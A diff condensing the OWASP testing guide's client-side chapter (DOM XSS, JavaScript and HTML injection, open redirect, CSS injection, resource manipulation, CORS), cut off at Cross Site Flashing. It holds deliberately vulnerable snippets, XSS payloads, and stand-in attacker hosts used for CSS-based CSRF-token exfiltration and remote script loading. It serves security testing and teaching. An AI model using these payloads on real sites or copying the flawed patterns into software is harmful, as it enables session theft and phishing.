@@ -1,22 +1,22 @@
 # WSTG CLNT — Client-side
 
-OWASP Web Security Testing Guide v4.2. 13 test cases: WSTG-CLNT-01, WSTG-CLNT-02, WSTG-CLNT-03, WSTG-CLNT-04, WSTG-CLNT-05, WSTG-CLNT-06, WSTG-CLNT-07, WSTG-CLNT-08, WSTG-CLNT-09, WSTG-CLNT-10, WSTG-CLNT-11, WSTG-CLNT-12, WSTG-CLNT-13.
+OWASP WSTG v4.2. Tests WSTG-CLNT-01 → 13.
 
 ## Table of Contents
 
-- [WSTG-CLNT-01 — Testing for DOM-Based Cross Site Scripting](#wstg-clnt-01)
-- [WSTG-CLNT-02 — Testing for JavaScript Execution](#wstg-clnt-02)
-- [WSTG-CLNT-03 — Testing for HTML Injection](#wstg-clnt-03)
-- [WSTG-CLNT-04 — Testing for Client-side URL Redirect](#wstg-clnt-04)
-- [WSTG-CLNT-05 — Testing for CSS Injection](#wstg-clnt-05)
-- [WSTG-CLNT-06 — Testing for Client-side Resource Manipulation](#wstg-clnt-06)
-- [WSTG-CLNT-07 — Testing Cross Origin Resource Sharing](#wstg-clnt-07)
-- [WSTG-CLNT-08 — Testing for Cross Site Flashing](#wstg-clnt-08)
-- [WSTG-CLNT-09 — Testing for Clickjacking](#wstg-clnt-09)
-- [WSTG-CLNT-10 — Testing WebSockets](#wstg-clnt-10)
-- [WSTG-CLNT-11 — Testing Web Messaging](#wstg-clnt-11)
-- [WSTG-CLNT-12 — Testing Browser Storage](#wstg-clnt-12)
-- [WSTG-CLNT-13 — Testing for Cross Site Script Inclusion](#wstg-clnt-13)
+- [CLNT-01 DOM-Based XSS](#wstg-clnt-01)
+- [CLNT-02 JavaScript Execution](#wstg-clnt-02)
+- [CLNT-03 HTML Injection](#wstg-clnt-03)
+- [CLNT-04 Client-side URL Redirect](#wstg-clnt-04)
+- [CLNT-05 CSS Injection](#wstg-clnt-05)
+- [CLNT-06 Client-side Resource Manipulation](#wstg-clnt-06)
+- [CLNT-07 Cross Origin Resource Sharing](#wstg-clnt-07)
+- [CLNT-08 Cross Site Flashing](#wstg-clnt-08)
+- [CLNT-09 Clickjacking](#wstg-clnt-09)
+- [CLNT-10 WebSockets](#wstg-clnt-10)
+- [CLNT-11 Web Messaging](#wstg-clnt-11)
+- [CLNT-12 Browser Storage](#wstg-clnt-12)
+- [CLNT-13 Cross Site Script Inclusion](#wstg-clnt-13)
 
 ---
 
@@ -24,112 +24,32 @@ OWASP Web Security Testing Guide v4.2. 13 test cases: WSTG-CLNT-01, WSTG-CLNT-02
 
 **Testing for DOM-Based Cross Site Scripting**
 
-Summary
-DOM-based cross-site scripting is the de-facto name for XSS bugs that are the result of active browser-side content on
-a page, typically JavaScript, obtaining user input through a source and using it in a sink, leading to the execution of
-injected code. This document only discusses JavaScript bugs which lead to XSS.
-The DOM, or Document Object Model, is the structural format used to represent documents in a browser. The DOM
-enables dynamic scripts such as JavaScript to reference components of the document such as a form field or a session
-cookie. The DOM is also used by the browser for security - for example to limit scripts on different domains from
-obtaining session cookies for other domains. A DOM-based XSS vulnerability may occur when active content, such as
-a JavaScript function, is modified by a specially crafted request such that a DOM element that can be controlled by an
-attacker.
-Not all XSS bugs require the attacker to control the content returned from the server, but can instead abuse poor
-JavaScript coding practices to achieve the same results. The consequences are the same as a typical XSS flaw, only
-the means of delivery is different.
-In comparison to other types of cross site scripting vulnerabilities (reflected and stored, where an un-sanitized
-parameter is passed by the server then returned to the user and executed in the context of the user's browser, a DOMbased XSS vulnerability controls the flow of the code by using elements of the Document Object Model (DOM) along
-with code crafted by the attacker to change the flow.
-Due to their nature, DOM-based XSS vulnerabilities can be executed in many instances without the server being able
-to determine what is actually being executed. This may make many of the general XSS filtering and detection
-techniques impotent to such attacks.
-This hypothetical example uses the following client-side code:
+Goal: find JavaScript that reads attacker-influenced data from a source (`window.location`, `document.referrer`, `document.URL`, `location.hash`, etc.) and writes it into a sink (`document.write`, `innerHTML`, `eval`, etc.) without sanitization — all executed client-side, so the server never sees the payload.
 
+Unlike reflected/stored XSS, the malicious data never has to round-trip through the server: everything after a `#` fragment, for instance, is never even sent in the request. This makes server-side filtering and most automated scanners blind to it — they check the response body, not runtime DOM state.
+
+```html
 <script>
 document.write("Site is at: " + document.location.href + ".");
 </script>
+```
+Appending `#<script>alert('xss')</script>` to the URL executes immediately in the browser; the fragment is never transmitted to the server. Exploitability differs by source: server-inserted values depend on server-side filtering, while raw browser objects (`window.location`, etc.) depend on the browser's own encoding.
 
-An attacker may append #<script>alert('xss')</script> to the affected page URL which would, when executed,
-display the alert box. In this instance, the appended code would not be sent to the server as everything after the #
-character is not treated as part of the query by the browser, but as a fragment. In this example, the code is immediately
-executed and an alert of "xss" is displayed by the page. Unlike the more common types of cross site scripting (reflected
-and stored in which the code is sent to the server and then back to the browser, this is executed directly in the user's
-browser without server contact.
-The consequences of DOM-based XSS flaws are as wide ranging as those seen in more well known forms of XSS,
-including cookie retrieval, further malicious script injection, etc., and should therefore be treated with the same severity.
-
-Test Objectives
-Identify DOM sinks.
-Build payloads that pertain to every sink type.
-
-How to Test
-JavaScript applications differ significantly from other types of applications because they are often dynamically
-generated by the server. To understand what code is being executed, the website being tested needs to be crawled to
-determine all the instances of JavaScript being executed and where user input is accepted. Many websites rely on
-large libraries of functions, which often stretch into the hundreds of thousands of lines of code and have not been
-developed in-house. In these cases, top-down testing often becomes the only viable option, since many bottom level
-functions are never used, and analyzing them to determine which are sinks will use up more time than is often
-available. The same can also be said for top-down testing if the inputs or lack thereof is not identified to begin with.
-User input comes in two main forms:
-Input written to the page by the server in a way that does not allow direct XSS, and
-Input obtained from client-side JavaScript objects.
-Here are two examples of how the server may insert data into JavaScript:
-
-var data = "<escaped data from the server>";
-var result = someFunction("<escaped data from the server>");
-
-Here are two examples of input from client-side JavaScript objects:
-
-var data = window.location;
-var result = someFunction(window.referrer);
-
-While there is little difference to the JavaScript code in how they are retrieved, it is important to note that when input is
-received via the server, the server can apply any permutations to the data that it desires. On the other hand, the
-permutations performed by JavaScript objects are fairly well understood and documented. If someFunction in the
-above example were a sink, then the exploitability in the former case would depend on the filtering done by the server,
-whereas in the latter case it would depend on the encoding done by the browser on the window.referrer object.
-Stefano Di Paulo has written an excellent article on what browsers return when asked for the various elements of a
-URL using the document and location attributes.
-Additionally, JavaScript is often executed outside of <script> blocks, as evidenced by the many vectors which have
-led to XSS filter bypasses in the past. When crawling the application, it is important to note the use of scripts in places
-such as event handlers and CSS blocks with expression attributes. Also, note that any off-site CSS or script objects will
-need to be assessed to determine what code is being executed.
-Automated testing has only very limited success at identifying and validating DOM-based XSS as it usually identifies
-XSS by sending a specific payload and attempts to observe it in the server response. This may work fine for the simple
-example provided below, where the message parameter is reflected back to the user:
-
-<script>
-var pos=document.URL.indexOf("message=")+5;
-document.write(document.URL.substring(pos,document.URL.length));
-</script>
-
-However, it may not be detected in the following contrived case:
-
+A case scanners typically miss (payload never reflected, only conditionally executed):
+```html
 <script>
 var navAgt = navigator.userAgent;
 if (navAgt.indexOf("MSIE")!=-1) {
-
-document.write("You are using IE as a browser and visiting site: " + document.location.href
-+ ".");
-}
-else
-{
-document.write("You are using an unknown browser.");
+  document.write("You are using IE as a browser and visiting site: " + document.location.href + ".");
 }
 </script>
+```
 
-For this reason, automated testing will not detect areas that may be susceptible to DOM-based XSS unless the testing
-tool can perform additional analysis of the client-side code.
-Manual testing should therefore be undertaken and can be done by examining areas in the code where parameters
-are referred to that may be useful to an attacker. Examples of such areas include places where code is dynamically
-written to the page and elsewhere where the DOM is modified or even where scripts are directly executed.
+Black-box: crawl the app and enumerate every JavaScript source/sink pair, including code outside `<script>` blocks (event handlers, CSS `expression()`, off-site includes). Manual review is required — automated tools only catch cases where the payload is reflected back in the server response.
 
-Remediation
-For measures to prevent DOM-based XSS, see the DOM-based XSS Prevention Cheat Sheet.
+Remediation: see the DOM-based XSS Prevention Cheat Sheet.
 
-References
-DomXSSWiki
-DOM XSS article by Amit Klein
+Refs: DomXSSWiki; DOM XSS article by Amit Klein.
 
 ---
 
@@ -137,47 +57,30 @@ DOM XSS article by Amit Klein
 
 **Testing for JavaScript Execution**
 
-Summary
-A JavaScript injection vulnerability is a subtype of cross site scripting (XSS) that involves the ability to inject arbitrary
-JavaScript code that is executed by the application inside the victim's browser. This vulnerability can have many
-consequences, like the disclosure of a user's session cookies that could be used to impersonate the victim, or, more
-generally, it can allow the attacker to modify the page content seen by the victims or the application's behavior.
-JavaScript injection vulnerabilities can occur when the application lacks proper user-supplied input and output
-validation. As JavaScript is used to dynamically populate web pages, this injection occurs during this content
-processing phase and consequently affects the victim.
-When testing for this vulnerability, consider that some characters are treated differently by different browsers. For
-reference, see DOM-based XSS.
-Here is an example of a script that does not perform any validation of the variable rr . The variable contains usersupplied input via the query string, and additionally does not apply any form of encoding:
+Goal: find an injection point where attacker-controlled input reaches a JavaScript execution sink (`eval`, `window.location` assignment with a `javascript:` scheme, etc.), letting the attacker run arbitrary script in the victim's browser.
 
+```js
 var rr = location.search.substring(1);
 if(rr) {
-window.location=decodeURIComponent(rr);
+  window.location=decodeURIComponent(rr);
 }
+```
+Exploitable via `www.victim.com/?javascript:alert(1)` — no encoding is applied before the value reaches `window.location`.
 
-This implies that an attacker could inject JavaScript code simply by submitting the following query string:
-www.victim.com/?javascript:alert(1) .
-
-Test Objectives
-Identify sinks and possible JavaScript injection points.
-
-How to Test
-Consider the following: DOM XSS exercise
-The page contains the following script:
-
+```html
 <script>
 function loadObj(){
-var cc=eval('('+aMess+')');
-document.getElementById('mess').textContent=cc.message;
+  var cc=eval('('+aMess+')');
+  document.getElementById('mess').textContent=cc.message;
 }
 if(window.location.hash.indexOf('message')==-1) {
-var aMess='({"message":"Hello User!"})';
+  var aMess='({"message":"Hello User!"})';
 } else {
-var aMess=location.hash.substr(window.location.hash.indexOf('message=')+8)
+  var aMess=location.hash.substr(window.location.hash.indexOf('message=')+8)
 }
 </script>
-
-The above code contains a source location.hash that is controlled by the attacker that can inject directly in the
-message value a JavaScript Code to take the control of the user browser.
+```
+Here `location.hash` (source) reaches `eval()` (sink) — an attacker controls the `message` value directly.
 
 ---
 
@@ -185,65 +88,33 @@ message value a JavaScript Code to take the control of the user browser.
 
 **Testing for HTML Injection**
 
-Summary
-HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to
-inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like
-disclosure of a user's session cookies that could be used to impersonate the victim, or, more generally, it can allow the
-attacker to modify the page content seen by the victims.
-This vulnerability occurs when user input is not correctly sanitized and the output is not encoded. An injection allows
-the attacker to send a malicious HTML page to a victim. The targeted browser will not be able to distinguish (trust)
-legitimate parts from malicious parts of the page, and consequently will parse and execute the whole page in the
-victim's context.
-There is a wide range of methods and attributes that could be used to render HTML content. If these methods are
-provided with an untrusted input, then there is an high risk of HTML injection vulnerability. For example, malicious
-HTML code can be injected via the innerHTML JavaScript method, usually used to render user-inserted HTML code. If
-strings are not correctly sanitized, the method can enable HTML injection. A JavaScript function that can be used for
-this purpose is document.write() .
-The following example shows a snippet of vulnerable code that allows an unvalidated input to be used to create
-dynamic HTML in the page context:
+Goal: find input that reaches an HTML-rendering sink (`innerHTML`, `document.write()`) unsanitized, letting an attacker inject arbitrary markup that the browser trusts as part of the page.
 
+```js
 var userposition=location.href.indexOf("user=");
 var user=location.href.substring(userposition+5);
 document.getElementById("Welcome").innerHTML=" Hello, "+user;
-
-The following example shows vulnerable code using the document.write() function:
-
-var userposition=location.href.indexOf("user=");
-var user=location.href.substring(userposition+5);
+```
+```js
 document.write("<h1>Hello, " + user +"</h1>");
-
-In both examples, this vulnerability can be exploited with an input such as:
-
+```
+Both exploitable with:
+```
 http://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>
+```
 
-This input will add an image tag to the page that will execute arbitrary JavaScript code inserted by the malicious user in
-the HTML context.
-
-Test Objectives
-Identify HTML injection points and assess the severity of the injected content.
-
-How to Test
-
-Consider the following DOM XSS exercise http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html
-The HTML code contains the following script:
-
+Another example (jQuery, unescaped hash-driven selector/content):
+```html
 <script src="../js/jquery-1.7.1.js"></script>
 <script>
 function setMessage(){
-var t=location.hash.slice(1);
-$("div[id="+t+"]")text("the-dom-is-now-loaded-and-can-be-manipulated");
+  var t=location.hash.slice(1);
+  $("div[id="+t+"]").text("the-dom-is-now-loaded-and-can-be-manipulated");
 }
-$(document).ready(setMessage );
+$(document).ready(setMessage);
 $(window).bind("hashchange",setMessage)
 </script>
-<body>
-<script src="../js/embed.js"></script>
-<span><a href="#message" > Show Here</a><div id="message">Showing Message1</div></span>
-<span><a href="#message1" > Show Here</a><div id="message1">Showing Message2</div>
-<span><a href="#message2" > Show Here</a><div id="message2">Showing Message3</div>
-</body>
-
-It is possible to inject HTML code.
+```
 
 ---
 
@@ -251,60 +122,26 @@ It is possible to inject HTML code.
 
 **Testing for Client-side URL Redirect**
 
-Summary
-This section describes how to check for client-side URL redirection, also known as open redirection. It is an input
-validation flaw that exists when an application accepts user-controlled input that specifies a link which leads to an
-external URL that could be malicious. This kind of vulnerability could be used to accomplish a phishing attack or
-redirect a victim to an infection page.
-This vulnerability occurs when an application accepts untrusted input that contains a URL value and does not sanitize
-it. This URL value could cause the web application to redirect the user to another page, such as a malicious page
-controlled by the attacker.
-This vulnerability may enable an attacker to successfully launch a phishing scam and steal user credentials. Since the
-redirection is originated by the real application, the phishing attempts may have a more trustworthy appearance.
-Here is an example of a phishing attack URL.
+Goal: find client-side code that redirects the browser (`window.location`, etc.) based on unsanitized user input — usable for phishing (the redirect originates from the trusted domain) or for bypassing access controls by chaining to a privileged path.
 
-http://www.target.site?#redirect=www.fake-target.site
-
-The victim that visits this URL will be automatically redirected to fake-target.site , where an attacker could place a
-fake page that resembles the intended site, in order to steal the victim's credentials.
-Open redirection could also be used to craft a URL that would bypass the application's access control checks and
-forward the attacker to privileged functions that they would normally not be able to access.
-
-Test Objectives
-Identify injection points that handle URLs or paths.
-Assess the locations that the system could redirect to.
-
-How to Test
-When testers manually check for this type of vulnerability, they first identify if there are client-side redirections
-implemented in the client-side code. These redirections may be implemented, to give a JavaScript example, using the
-window.location object. This can be used to direct the browser to another page by simply assigning a string to it. This
-is demonstrated in the following snippet:
-
+```js
 var redir = location.hash.substring(1);
 if (redir) {
-window.location='http://'+decodeURIComponent(redir);
+  window.location='http://'+decodeURIComponent(redir);
 }
+```
+Exploit: `http://www.victim.site/?#www.malicious.site`
 
-In this example, the script does not perform any validation of the variable redir which contains the user-supplied
-input via the query string. Since no form of encoding is applied, this unvalidated input is passed to the
-windows.location object, creating a URL redirection vulnerability.
-This implies that an attacker could redirect the victim to a malicious site simply by submitting the following query string:
-
-http://www.victim.site/?#www.malicious.site
-
-With a slight modification, the above example snippet can be vulnerable to JavaScript injection.
-
+A slight variant is exploitable for JavaScript injection instead of just redirect ([CLNT-02](#wstg-clnt-02)):
+```js
 var redir = location.hash.substring(1);
 if (redir) {
-window.location=decodeURIComponent(redir);
+  window.location=decodeURIComponent(redir);
 }
+```
+Exploit: `http://www.victim.site/?#javascript:alert(document.cookie)`
 
-This can be exploited by submitting the following query string:
-
-http://www.victim.site/?#javascript:alert(document.cookie)
-
-When testing for this vulnerability, consider that some characters are treated differently by different browsers. For
-reference, see DOM-based XSS.
+Note browsers treat certain characters differently when parsing URLs — see [CLNT-01](#wstg-clnt-01).
 
 ---
 
@@ -312,81 +149,51 @@ reference, see DOM-based XSS.
 
 **Testing for CSS Injection**
 
-Summary
-A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is
-rendered inside a victim's browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It
-may lead to cross site scripting or data exfiltration.
-This vulnerability occurs when the application allows user-supplied CSS to interfere with the application's legitimate
-style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain
-conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally,
-allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.
-The following JavaScript code shows a possible vulnerable script in which the attacker is able to control the
-location.hash (source) which reaches the cssText function (sink). This particular case may lead to DOM-based
+Goal: find a point where attacker-controlled input reaches a CSS sink (`cssText`, a `<style>` block, an inline `style` attribute), which — depending on browser — can lead to script execution or data exfiltration via CSS selectors.
 
-XSS in older browser versions; for more information, see the DOM-based XSS Prevention Cheat Sheet.
-
+```html
 <a id="a1">Click me</a>
 <script>
 if (location.hash.slice(1)) {
-document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
+  document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
 }
 </script>
-
-The attacker could target the victim by asking them to visit the following URLs:
-www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current; (Opera [8,12])
+```
+Old-browser exploits:
+```
+www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current; (Opera 8-12)
 www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)
+```
 
-The same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:
-
+Reflected variant (PHP):
+```php
 <style>
-p {
-color: <?php echo $_GET['color']; ?>;
-text-align: center;
-}
+p { color: <?php echo $_GET['color']; ?>; text-align: center; }
 </style>
+```
 
-Further attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be
-conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens.
-Here is an example of code that attempts to select an input with a name matching csrf_token and a value
-beginning with an a . By utilizing a brute-force attack to determine the attribute's value , it is possible to carry out an
-attack that sends the value to the attacker's domain, such as by attempting to set a background image on the selected
-input element.
-
+**Data exfiltration via CSS selectors** — brute-force attribute values character by character using selectors like the following, which triggers a request to the attacker's server only when the guessed prefix matches:
+```html
 <style>
 input[name=csrf_token][value=^a] {
-
-background-image: url(http://attacker.com/log?a);
+  background-image: url(http://attacker.com/log?a);
 }
 </style>
+```
 
-Other attacks using solicited content such as CSS are highlighted in Mario Heiderich's talk, "Got Your Nose" on
-YouTube.
-
-Test Objectives
-Identify CSS injection points.
-Assess the impact of the injection.
-
-How to Test
-Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in
-which the website returns CSS rules on the basis of the inputs should be inspected.
-The following is a basic example:
-
-<a id="a1">Click me</a>
-<b>Hi</b>
+jQuery variant:
+```html
+<a id="a1">Click me</a><b>Hi</b>
 <script>
 $("a").click(function(){
-$("b").attr("style","color: " + location.hash.slice(1));
+  $("b").attr("style","color: " + location.hash.slice(1));
 });
 </script>
+```
 
-The above code contains a source location.hash , controlled by the attacker, that can inject directly in the style
-attribute of an HTML element. As mentioned above, this may lead to different results depending on the browser in use
-and the supplied payload.
-The following pages provide examples of CSS injection vulnerabilities:
-Password "cracker" via CSS and HTML5
-CSS attribute reading
-JavaScript based attacks using CSSStyleDeclaration with unescaped input
-For further OWASP resources on preventing CSS injection, see the Securing Cascading Style Sheets Cheat Sheet.
+Remediation: see the Securing Cascading Style Sheets Cheat Sheet.
+
+Refs: "Got Your Nose" (Mario Heiderich); Password "cracker" via CSS and HTML5; CSS attribute reading.
 
 ---
 
@@ -394,125 +201,45 @@ For further OWASP resources on preventing CSS injection, see the Securing Cascad
 
 **Testing for Client-side Resource Manipulation**
 
-Summary
-A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts usercontrolled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler
-of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present
-in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This
-vulnerability makes it is possible to interfere with the expected application's behavior by causing it to load and render
-malicious objects.
-The following JavaScript code shows a possible vulnerable script in which an attacker is able to control the
-location.hash (source) which reaches the attribute src of a script element. This particular case leads to a XSS
-attack as external JavaScript could be injected.
+Goal: find user-controlled input that sets the URL of a resource the page loads (script `src`, iframe `src`, XHR target, etc.) — usable to inject malicious script or content, or to redirect a CORS request to an attacker-controlled origin.
 
-<script>
-var d=document.createElement("script");
-if(location.hash.slice(1)) {
-d.src = location.hash.slice(1);
-}
-document.body.appendChild(d);
-</script>
-
-An attacker could target a victim by causing them to visit this URL:
-www.victim.com/#http://evil.com/js.js
-
-Where js.js contains:
-
-alert(document.cookie)
-
-This would cause the alert to pop up on the victim's browser.
-A more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS
-allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker
-may ask the target page to load malicious content from its own website.
-Here is an example of a vulnerable page:
-
+Most damaging case: controlling the URL of a CORS request whose response is then rendered:
+```html
 <b id="p"></b>
 <script>
 function createCORSRequest(method, url) {
-var xhr = new XMLHttpRequest();
-xhr.open(method, url, true);
-xhr.onreadystatechange = function () {
-if (this.status == 200 && this.readyState == 4) {
-document.getElementById('p').innerHTML = this.responseText;
-}
-};
-
-return xhr;
+  var xhr = new XMLHttpRequest();
+  xhr.open(method, url, true);
+  xhr.onreadystatechange = function () {
+    if (this.status == 200 && this.readyState == 4) {
+      document.getElementById('p').innerHTML = this.responseText;
+    }
+  };
+  return xhr;
 }
 var xhr = createCORSRequest('GET', location.hash.slice(1));
 xhr.send(null);
 </script>
-
-The location.hash is controlled by user input and is used for requesting an external resource, which will then be
-reflected through the construct innerHTML . An attacker could ask a victim to visit the following URL:
-www.victim.com/#http://evil.com/html.html
-
-With the payload handler for html.html :
-
-<?php
-header('Access-Control-Allow-Origin: http://www.victim.com');
-?>
+```
+Exploit: `www.victim.com/#http://evil.com/html.html`, where `html.html` returns:
+```php
+<?php header('Access-Control-Allow-Origin: http://www.victim.com'); ?>
 <script>alert(document.cookie);</script>
+```
 
-Test Objectives
-Identify sinks with weak input validation.
-Assess the impact of the resource manipulation.
+Sinks to check across the app (any tag/method that loads a resource by URL):
 
-How to Test
-To manually check for this type of vulnerability, we must identify whether the application employs inputs without
-correctly validating them. If so, these inputs are under the control of the user and could be used to specify external
-resources. Since there are many resources that could be included in the application (such as images, video, objects,
-css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.
-The following table shows possible injection points (sink) that should be checked:
-Resource Type
+| Resource | Tag/Method | Sink attribute |
+|---|---|---|
+| Frame | `iframe` | `src` |
+| Link | `a` | `href` |
+| AJAX | `xhr.open(method, url, true)` | url param |
+| CSS | `link` | `href` |
+| Image | `img` | `src` |
+| Object | `object` | `data` |
+| Script | `script` | `src` |
 
-Tag/Method
-
-Sink
-
-Frame
-
-iframe
-
-src
-
-Link
-
-a
-
-href
-
-AJAX Request
-
-xhr.open(method, [url], true);
-
-URL
-
-CSS
-
-link
-
-href
-
-Image
-
-img
-
-src
-
-Object
-
-object
-
-data
-
-Script
-
-script
-
-src
-
-The most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that
-could lead to XSS vulnerabilities.
+Script/object sinks are the most dangerous — they let an attacker load arbitrary executable content.
 
 ---
 
@@ -520,142 +247,53 @@ could lead to XSS vulnerabilities.
 
 **Testing Cross Origin Resource Sharing**
 
-Summary
-Cross origin resource sharing (CORS) is a mechanism that enables a web browser to perform cross-domain requests
-using the XMLHttpRequest L2 API in a controlled manner. In the past, the XMLHttpRequest L1 API only allowed
-requests to be sent within the same origin as it was restricted by the same origin policy.
-Cross-origin requests have an origin header that identifies the domain initiating the request and is always sent to the
-server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin
-request is allowed. HTTP headers are used to accomplish this.
-The W3C CORS specification mandates that for non simple requests, such as requests other than GET or POST or
-requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will
-have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if
-credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is
-allowed or not.
+Goal: confirm CORS is configured to only allow the specific origins that legitimately need cross-domain access, and that any code building cross-origin requests from user input validates it.
 
-Origin & Access-Control-Allow-Origin
-The origin header is always sent by the browser in a CORS request and indicates the origin of the request. The origin
-header can not be changed from JavaScript however relying on this header for Access Control checks is not a good
-idea as it may be spoofed outside the browser, so you still need to check that application-level protocols are used to
-protect sensitive data.
-Access-Control-Allow-Origin is a response header used by a server to indicate which domains are allowed to read the
-response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether
-the client has access to the response data based on this header.
-From a penetration testing perspective you should look for insecure configurations as for example using a * wildcard
-as value of the Access-Control-Allow-Origin header that means all domains are allowed. Other insecure example is
-when the server returns back the origin header without any additional checks, what can lead to access of sensitive
-data. Note that this configuration is very insecure, and is not acceptable in general terms, except in the case of a public
-API that is intended to be accessible by everyone.
+CORS lets the browser perform cross-domain requests (superseding the same-origin-only XHR L1 API) via a header-based handshake. For non-simple requests (non-GET/POST, or credentialed) the browser first sends a preflight `OPTIONS` request to check what's permitted.
 
-Access-Control-Request-Method & Access-Control-Allow-Method
-The Access-Control-Request-Method header is used when a browser performs a preflight OPTIONS request and let the
-client indicate the request method of the final request. On the other hand, the Access-Control-Allow-Method is a
-response header used by the server to describe the methods the clients are allowed to use.
+| Header | Direction | Purpose |
+|---|---|---|
+| `Origin` | request | domain making the request; browser-set, not spoofable from JS — but still spoofable outside the browser, so don't rely on it alone for access control |
+| `Access-Control-Allow-Origin` | response | which origins may read the response; enforcement happens client-side per spec |
+| `Access-Control-Request-Method` / `-Allow-Method` | preflight | method the real request will use / methods the server permits |
+| `Access-Control-Request-Headers` / `-Allow-Headers` | preflight | headers the real request will use / headers the server permits |
+| `Access-Control-Allow-Credentials` | response | whether the request may include user credentials |
+| `Access-Control-Max-Age` | response | how long the browser may cache the preflight result |
+| `Access-Control-Expose-Headers` | response | which response headers are readable by client script |
 
-Access-Control-Request-Headers & Access-Control-Allow-Headers
-These two headers are used between the browser and the server to determine which headers can be used to perform
-a cross-origin request.
+**Insecure configs to flag**: `Access-Control-Allow-Origin: *` (any domain can read the response — acceptable only for a genuinely public API); reflecting the `Origin` header back verbatim as `Access-Control-Allow-Origin` without an allowlist check (effectively equivalent to `*`, but easy to overlook).
 
-Access-Control-Allow-Credentials
-This header as part of a preflight request indicates that the final request can include user credentials.
+**Input validation** — check whether URLs passed to `XMLHttpRequest` (especially absolute URLs) are validated, and whether the response is safely handled (not sunk into `innerHTML` unescaped).
 
-Input Validation
-
-XMLHttpRequest L2 (or XHR L2) introduces the possibility of creating a cross-domain request using the XHR API for
-backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points
-of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs
-are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if
-the response data is not escaped and we can control it by providing user-supplied input.
-
-Other Headers
-There are other headers involved like Access-Control-Max-Age that determines the time a preflight request can be
-cached in the browser, or Access-Control-Expose-Headers that indicates which headers are safe to expose to the API
-of a CORS API specification, both are response headers specified in the CORS W3C document.
-
-Test Objectives
-Identify endpoints that implement CORS.
-Ensure that the CORS configuration is secure or harmless.
-
-How to Test
-A tool such as ZAP can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should
-pay particular attention to the origin header to learn which domains are allowed. Also, manual inspection of the
-JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user
-supplied input. Below are some examples:
-
-Example 1: Insecure Response with Wildcard `*` in Access-Control-Allow-Origin
-Request http://attacker.bar/test.php (note the 'origin' header):
-
+Example — wildcard origin:
+```
 GET /test.php HTTP/1.1
 Host: attacker.bar
-[...]
 Referer: http://example.foo/CORSexample1.html
 Origin: http://example.foo
-Connection: keep-alive
-
-Response (note the 'Access-Control-Allow-Origin' header:)
 
 HTTP/1.1 200 OK
-[...]
 Access-Control-Allow-Origin: *
-Content-Length: 4
-Content-Type: application/xml
-[Response Body]
+```
 
-Example 2: Input Validation Issue: XSS with CORS
-This code makes a request to the resource passed after the # character in the URL, initially used to get resources in
-the same server.
-Vulnerable code:
-
+Example — XSS via unvalidated CORS target:
+```html
 <script>
 var req = new XMLHttpRequest();
 req.onreadystatechange = function() {
-if(req.readyState==4 && req.status==200) {
-document.getElementById("div1").innerHTML=req.responseText;
-}
-
+  if(req.readyState==4 && req.status==200) {
+    document.getElementById("div1").innerHTML=req.responseText;
+  }
 }
 var resource = location.hash.substring(1);
 req.open("GET",resource,true);
 req.send();
 </script>
-<body>
 <div id="div1"></div>
-</body>
+```
+`http://example.foo/main.php#profile.php` fetches a same-server file as intended. But with no origin validation, `http://example.foo/main.php#http://attacker.bar/file.php` fetches and renders attacker-controlled content — and if `attacker.bar` sets `Access-Control-Allow-Origin: *`, the injected script executes in `example.foo`'s context.
 
-For example, a request like this will show the contents of the profile.php file:
-http://example.foo/main.php#profile.php
-
-Request and response generated by http://example.foo/profile.php :
-
-GET /profile.php HTTP/1.1
-Host: example.foo
-[...]
-Referer: http://example.foo/main.php
-Connection: keep-alive
-HTTP/1.1 200 OK
-[...]
-Content-Length: 25
-Content-Type: text/html
-[Response Body]
-
-Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the
-example.foo domain, with a URL like this:
-
-http://example.foo/main.php#http://attacker.bar/file.php
-
-Request and response generated by http://attacker.bar/file.php :
-
-GET /file.php HTTP/1.1
-Host: attacker.bar
-[...]
-Referer: http://example.foo/main.php
-origin: http://example.foo
-HTTP/1.1 200 OK
-[...]
-Access-Control-Allow-Origin: *
-Content-Length: 92
-Content-Type: text/html
-Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
+Tools: OWASP ZAP (intercept and inspect CORS headers).
 
 ---
 
@@ -663,278 +301,52 @@ Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+docume
 
 **Testing for Cross Site Flashing**
 
-Summary
